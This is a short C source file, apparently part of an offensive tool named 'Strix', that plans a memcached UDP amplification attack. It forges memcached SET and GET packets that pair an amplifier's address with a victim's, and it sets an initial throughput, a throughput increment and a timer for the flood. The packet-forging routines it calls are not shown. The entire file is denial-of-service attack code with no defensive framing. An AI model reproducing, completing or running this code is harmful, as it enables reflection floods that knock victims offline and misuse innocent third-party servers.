#include "strix.h"
#include "common/blacksmith.h"
#include "planner.h"
#include "memcachedforge.h"

#define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT

static AttackPlan * createAttackData( AttackDraft *draft )
{
  AttackPlan *newData;
  int arg;

  memalloc( (void *)&newData, sizeof( AttackPlan ) );
  arg = MEMCACHED_SET;
  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
  arg = MEMCACHED_GET;
  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedPacket, &arg );
  newData->initialThroughput = draft->initialThroughput;
  newData->incrementAttack = draft->incrementThroughput;
  newData->timer = draft->timer;

  return newData;
}

AttackPlan * StrixPlanner( AttackDraft *p_draft )
{
    if( NULL == p_draft )
    {
        return NULL;
    }
    return createAttackData( p_draft );   
}

